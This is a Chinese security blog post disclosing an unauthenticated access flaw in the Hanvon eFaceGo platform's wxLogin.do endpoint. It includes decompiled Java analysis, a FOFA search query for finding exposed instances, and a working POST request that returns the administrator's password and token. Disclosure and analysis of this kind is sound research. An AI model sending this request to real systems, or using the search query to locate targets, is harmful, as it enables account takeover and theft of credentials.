---
title: "汉王e脸通综合管理平台 wxLogin.do 未授权访问致敏感信息泄漏"
source: https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html
asset_dir: assets/汉王e脸通综合管理平台-wxlogin.do-未授权访问致敏感信息泄漏
---

# 汉王e脸通综合管理平台 wxLogin.do 未授权访问致敏感信息泄漏

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/8 12:29
- 1467浏览
- [0评论](#comment)
- 47分钟阅读

深入探索

安全工具开发

安全研究工具

漏洞预警服务

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `wxLogin.do` 接口存在信息泄露漏洞，[未授权](https://mrxn.net/tag/未授权)攻击者可利用该漏洞获取系统敏感信息。

网络安全

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `wxLogin` 的实现

```
@ResponseBody
    @RequestMapping({"/wxLogin.do"})
    public MethodResult wxLogin(@RequestParam("openid") String openid, @RequestParam("username") String username, @RequestParam("password") String password, @RequestParam("flag") boolean flag, @RequestParam("id") Long id) throws Exception {
        UserTpm cUser = null;
        String newUsername = URLDecoder.decode(username, "utf-8");
        if (flag) {
            cUser = (UserTpm)this.userAsm.getUser(id).getResult();
            cUser.setOpenid(openid);
            if (cUser.getBlacklist() != null && cUser.getBlacklist() || cUser.getState() != null && cUser.getState() <= 0) {
                return MethodResult.errorResult("用户已被禁止登录");
            }
        } else {
            if (Utils.isEmpty(newUsername) || Utils.isEmpty(password)) {
                return MethodResult.errorResult("参数错误");
            }

            if (username.equalsIgnoreCase("ADMIN")) {
                return MethodResult.errorResult("超级管理员禁止登录");
            }

            UserTpm user = null;

            try {
                user = this.userAsm.getAttendServiceUser(newUsername, this.strUtil.getSHAString(this.strUtil.md5(password)));
            } catch (Exception e) {
                e.printStackTrace();
                return MethodResult.errorResult("系统系统异常");
            }

            if (user == null) {
                return MethodResult.errorResult("用户名/密码不匹配");
            }

            if (user.getBlacklist() != null && user.getBlacklist() || user.getState() != null && user.getState() <= 0) {
                return MethodResult.errorResult("用户已被禁止登录");
            }

            cUser = (UserTpm)this.userAsm.getUser(user.getId()).getResult();
            cUser.setOpenid(openid);
            this.setOpenId(cUser);
        }

        MethodResult<List<ApproverTpm>> approver = this.approverAsm.getApproverByUserId(cUser.getId());
        boolean isApprover = approver != null && approver.isSuccess() && approver.getResult() != null && ((List)approver.getResult()).size() > 0;
        boolean isAgent = false;
        if (!isApprover) {
            MethodResult<List<ProcessAgentTpm>> agent = this.agentAsm.getApproverByAgentId(cUser.getId());
            isAgent = agent != null && agent.isSuccess() && agent.getResult() != null && ((List)agent.getResult()).size() > 0;
        }

        cUser.setApprover(isApprover || isAgent);

        for(String tk : this.tokenHash.keySet()) {
            UserTpm u = (UserTpm)this.tokenHash.get(tk);
            if (u != null && u.getId().equals(cUser.getId())) {
                this.tokenHash.remove(tk);
                break;
            }
        }

        String token = cUser.getEmployId() + UUID.randomUUID().toString();

        try {
            token = this.strUtil.getSHAString(token);
        } catch (Exception var15) {
        }

        token = token.toUpperCase();

        try {
            this.wsTokenAsm.saveToken(cUser.getId(), cUser.getEmployId(), token, 1);
        } catch (Exception e) {
            e.printStackTrace();
            return MethodResult.errorResult("系统系统异常");
        }

        this.tokenHash.put(token, cUser);
        cUser.setToken(token);
        return MethodResult.successResult(cUser);
    }
```

跟进 `setOpenId` 方法

```
private MethodResult setOpenId(UserTpm user) {
        MethodResult result = null;
        UserTpm targetUser = null;

        try {
            MethodResult<UserTpm> userResult = this.weixinAsm.editUserOpenId(user);
            targetUser = (UserTpm)userResult.getResult();
            if (!userResult.isSuccess() || targetUser == null) {
                throw new Exception("添加openid失败！");
            }

            result = MethodResult.successResult("添加openid成功！");
        } catch (Exception e) {
            String msg = "登陆失败！原因：" + e.getLocalizedMessage();
            result = MethodResult.errorResult(msg);
        }

        return result;
    }
```

当flag为true时，它直接使用id获取用户，然后设置openid。但是，这里并没有验证传入的openid是否合法，也没有验证id是否属于当前用户。也就是说，只要知道一个用户的id，就可以通过设置flag=true，并传入该id和任意openid，就可以修改该用户的openid，并且获取到该用户的详细信息（包括token）。

漏洞修复方案

# 漏洞复现

> 使用id为1的管理员来测试

```
POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: application/x-www-form-urlencoded
```

[![汉王e脸通综合管理平台 wxLogin.do 未授权访问致敏感信息泄漏](images/img-001-f3dc855fefad.webp)](https://image.mrxn.net/1850826bbf024ee2ba8495ba88cf6fa8.webp)

可以获取到系统指定id（管理员）的密码以及可用于头部认证的token

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALb0lEQVR4Aeydi3LbRgxFdfr//9wavjnULsgVZSexNFN6glzeB0CKoBI/0uk/t9vt3+/Uv4sPZ2nLz9B8x96nry4vVOtY3lGZ01txddG82HX5d7AW8tF3/XqXO7At5GPbt2eqXzhwg3s5w5x8heZEuM8CtmvSF50nLzzSSofMrOOjgvj2w8zt6T4kp9/R/BmOfdtCRvE6ft0d2C0EsnWYcXWJffsw90F474fo9ut3Dsnpi7DXYa9V3pkQH4Llfaec92wv5Hww41H/biFHoUv7uTvwxxYC2X6/9NXTpA7pgxnP5hz1q3Xsszo3r77ikGs0J/a8+nfwjy3kOye/evZ34McXAvNT1p8ueUdIH8w4viSYPQg340y5CMlBUL1j7++857/Df3wh37nI/1PPbiFuvePqpkCeKvOfuYPf4HHOfkgOgo7S71x9xJ6RQ2aO2fG45zqH9ENQ/wzHc4zHR327hRyFLu3n7sC2EMjW4TE+e2k+CZB5nTsH4svFVV5fhPQDSjsEPr+bsJoJs78b8Euw/xfdANK/Cb8OIDo8xl/xT9gW8smu315+B/5x61/F1ZU7R18OeUq+yp2zQucV9gzknF1fcUi+ZlXBY76aU73fresdsrqrL9JPFwJ5SuAYfRL69cOcNwfR5as+9bMcZB7c0d4VOhPSs8qtdEgfBHsOokOw+3LY+6cLsfnCn7kD/0C2BEFPCzP3qRJ7Dp7L2w/JQ1DduZ2f6eX3HrlYmSrIOev4UfW+zu1Vh3nuSu998sLrHVJ34Y1q+yzLa4Js2e12HeKrd4T4ENSHcAiq9/PIITkI3m63zxYINzcixPsMfvwG4RD8kKZfY+94PIU+CDzu/4gc/oLjvsPwL/F6h/y6Ee8C20LGJ6SOIdut40flCzHTOcxzui8XYc6fzbVvRHvE0atjdci5SquCr/HqqYK5z/liZaogOQiWVgXhwG1byO36eIs7sH2W1a/m2e2ag2y5z+ncfNch/foQDsGel0N8uP8LFYhmps/sulyEuV/dOfIVwnP9sM9d75DVXX2Rvi0E9tsar8mnQ9SD9KmL+iIkB0H1FfY5MPd1f5zTPZh7x2wdQ3z7xPKeqVUe5rkQ7kz7RtwWYujC196B5UJg3iaEw4xuF6KvXo45fZjz+hAdguY7Qnz7CiFaz644JF+9VRDe8+VVdR3mfGWqem7FYe6v3HIhZV7183dgW0httspLqOMquVjaWF2XQ7ZvVr1zSG7lmxfNHaEZyEwI9ixE/8z/W//4f07A7EO4qVWfvmgO5n59EeID19chtzf72N4hcN8S3I/79UI8dQiHoLoIx7pPzyqnD4/7IT7c0Zmis0T1FZqDzOw5iG6u+2d69+WF20L60Iu/5g7svttbWxrLyxq1OobHT0nvk0P65DWrSg7xIVheVffl5Vldk0NmyUWIDsHVHHVIbtUPs2/Ofjkk1/Xyr3dI3YU3qtOFQLYJMx5td3xd3Yf0r/Sx93ePIedyjueEWe++HJKDoLrovBVXh/TDjPpHeLqQo6ZL+3t3YLcQyDY9pU9DR31IXr/r8Ni3T7RfDumH4EqH+3d7zThL7LocMhuC6iJEdw6E66ufYc9D5sAddws5G3r5f/cObD8P6dvztHDfHtyP9XsfJLPyuw7JQ7DPM/8MQmZA0FkQ7oyuy0VzcNy3yqkD078lXs1Tt6/weod4V94El1+HwOOnA+LDjL6u2nYVzD7MvDJj2Q/JyUWIbo/6IzQL6TWrLofZVxchPgTVnQOzDjPvefvUC693SN2FN6ptIZBtQrBvD6JD8Ow1QHLO6XjW33371SHz5V9BeK63n7Nzzwlfmwfr/LYQh1/42jvw9EJ8Ojp6+eryZxHWT8ujGZ7vCFd9Pdtz+urw+Npg9u3v6LwVQuYA189Dbm/2sfw6BLK1fr1wrPecT0nXzzgcz4fHOrAcDXx+XQAzrhogue5DdF+buMqd6ZB5Y+7pP7LGpuv4792BayF/795+a/K2ENi/fY4mrt6mZlc+HM/vebl4NtdcoVkR5nNWZiyYfQgfM3XsPBGSk3esnqqud16ZXttCevjir7kD27dO+qb65UCeCpjRHERfcefDcQ6Oded1hORhjz27Orc5yAxzXZd3X12EzIEZ9c/6K3e9Q+ouvFFtC4F5q25zhWevwT7IXPPqYtc7NweZIxfNfwVhnmUvRJf3c0D8rstF+8WVrj/itpBRvI5fdwe+vBB4/JT4UiA5+QpXTw98rb/m9HOUVgWZVcdjrfLqkD65vXIRjnPmYfZXfaV/eSHVdNXfuwNPf+sEsuW+dfnqEs98yFz7IXzVB/Fhj6seddj3AJ56+/bKJiwOgM/swt5keC63NXwcXO+Qj5vwTr92C/FpWl0kzFuHmdvnHOi+iRnhuZxzxXEKZIYehJtRF7suh/T1nL4IyclXuJpzpO8Wshp66T9zB7aFQLYNQU8PM+9b7dy+jjDP0T/rh/SZg/DeX74aJFNaVdflz2LNqOr50sbSh+Pz63eE5IHrB1S3N/vYvpe1ui6fAH3INuUiHOv6fY56R3OQefKeO+JmRTOQWWfcPrHnYZ7TfbkIx3n9I9z+yDoyL+3n78CXF+LTI/ZLhjwVENSHcDjGs3nOEeF4Duz1Plsu9pkrri5CzuUcCNfvOsx+z1X+ywtxyIV/5w5sC6ntjLU6HWTLMOMq33XP0XXIvK53vuqvnF5HyGx1CK+eKvU6Pip98ShTmr5YWpVcLG1V20JWgUv/2TuwXIjbhDxN8hV62d3vOmRe1+070yH95sVCiAczllfVZ8PjnHmYc+o1s0oOcw7C9VcIyQHX1yG3N/vYvUPgvi24/2diMOu+DoheT0qVulhaFcy50qrMQXy5CMe6/og176ggM2BGs+OMOobk6viZguRX81YzYO6r/t1CVs2X/jN3YPt5SD9dbavqTK9MlTnI1juvTFXXIfnyqvRXWJkqSB/csfdAvMqPZQ7id25WXew6pF8dws2LEB2C6vbJC693SN2FN6rte1mQ7R1tbbxeSA6CejBzdedBfAiqm3sWIf3mnVOoBsmUVgXhEDRXXpW8Y3ljdb/zMTser3JdL369Q+ouvFHtFgJ5iiDotY4bH4+7L4fj/u47q+uQ/u6bEyE5QGn7HxoDnz/7Xs2A+Db2HMSHGXse4qtDOATV+3x1SA64vg65vdnHlz/Lgmyzvw6YdZ8GONbth9lXt18Oxzn9QkgGgn1GZarUxdLGgvTfbqN6P/5u331CjiDncV7h7o+sRK/fX3UHts+yajtjrS7IjD7st1wZmPWel1e2CpJXh5lXpkq/jldlBjIDguorhMc5z2c/zHn9jmd5/cLrHVJ34Y1q+zsEsm14Ds9eg0+JOchcuT5El3eE+PZ1hPhAtzbuzE1oByt/pdu+8oHPz+7MdYS1f71D+t16Md8W4rbPcHW9sN569Ti3jqsg+a6XN9azfuXGvvEYHp8LZr9mVUF0Z0E4zKgvVm+VXCytSg7zHOD6OuT2Zh/bO8Trgv3WAO0l1uargOnPTwiHYGWqHATRYcbuy0WY83DnZsQ6XxXcM4D2DoHP11A9VQbq+Kj0IX0wY/fl4jhztxBDF77mDvz2Qtwu5KnoL0Nf1JeLXYfjeeZE+wuPtNIhs+p4LIhun2gG4sv1IToEu29O7L5chMwBrr9Dbm/28dvvkP563Lo63LcPKJ/iao66OA460kbfY+Dz7wi5CLPuPJh18yLMvn36HeE4X31/fCH95Bf/2h3YLaS2dFTPjoV5+/Y5E+LDjCvffhHmPvVCOPb67MpWqddxlRyO50D0ylaZr+Oqzkt7VDDPq+xuISVe9bo7sC0Esi14jKtL9ekQzT3LIee1r6NzRH1IH6C0Q2D6O6PP2DUsBPtEY513HXL+VQ7iA9dnWbc3+9jeIW92Xf/by/kPAAD//8CFFG4AAAAGSURBVAMATlBxrT9W/TIAAAAASUVORK5CYII=)

手机扫码阅读

网络安全
